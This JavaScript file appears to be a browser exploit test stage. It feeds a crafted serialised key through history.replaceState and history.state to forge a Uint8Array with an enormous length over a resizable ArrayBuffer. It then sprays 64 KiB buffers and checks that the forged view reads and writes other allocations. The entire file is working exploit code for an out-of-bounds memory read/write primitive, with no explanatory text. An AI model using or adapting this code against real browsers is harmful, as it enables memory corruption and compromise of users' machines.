// Check whether ordinary fixed buffers allocated after load occupy the observed 64 KiB slot.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | (bytes[k + 1] << 8)));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
var phase = "build";
var result;
try {
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var fixed = new ArrayBuffer(65536);
  new Uint8Array(fixed).fill(0x91);
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  filler[2] = fixed;
  for (var i = 3; i < 27; i++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + i);
    filler[i] = neighbor;
  }
  for (var j = 27; j < filler.length; j++) filler[j] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  mark("fixed_spray_ready");
  phase = "store";
  history.replaceState(input, "");
  mark("fixed_spray_stored");
  phase = "load";
  var output = history.state;
  mark("fixed_spray_loaded");
  var synthetic = output["\u0000"];
  var viewValid = synthetic instanceof Uint8Array &&
    synthetic.buffer === output.filler[1] && synthetic.byteOffset === 8 &&
    synthetic.length > 1e12;
  var before = [];
  var after = [];
  var matchedIndex = -1;
  var matchedStride = -1;
  var normalAfter = null;
  var restored = null;
  if (viewValid) {
    for (var n = 0; n < 8; n++) before.push(synthetic[65528 + n * 65536]);
    phase = "spray";
    var spray = [];
    for (var s = 0; s < 24; s++) {
      var buffer = new ArrayBuffer(65536);
      var view = new Uint8Array(buffer);
      view.fill(0x20 + s);
      spray.push(view);
    }
    mark("fixed_spray_allocated");
    for (var t = 0; t < 8; t++) {
      var value = synthetic[65528 + t * 65536];
      after.push(value);
      for (var k = 0; k < spray.length; k++) {
        if (value === 0x20 + k) {
          matchedIndex = k;
          matchedStride = t + 1;
          break;
        }
      }
    }
    if (matchedIndex >= 0) {
      phase = "alias_check";
      var target = spray[matchedIndex];
      var at = 65528 + (matchedStride - 1) * 65536;
      target[0] = 0xb7;
      normalAfter = synthetic[at];
      target[0] = 0x20 + matchedIndex;
      restored = synthetic[at];
      mark("fixed_spray_alias_checked");
    }
  }
  result = { id: "fixed_spray_reuse", status: viewValid ? "pass" : "fail", details: {
    view_valid: viewValid, before: before.join(","), after: after.join(","),
    matched_index: matchedIndex, matched_stride: matchedStride,
    normal_after: normalAfter, restored: restored,
    cloned_fixed_first: new Uint8Array(output.filler[2])[0],
    original_fixed_first: new Uint8Array(fixed)[0],
    target_first: new Uint8Array(output.filler[1])[0]
  } };
} catch (error) {
  result = { id: "fixed_spray_reuse", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
return [result];
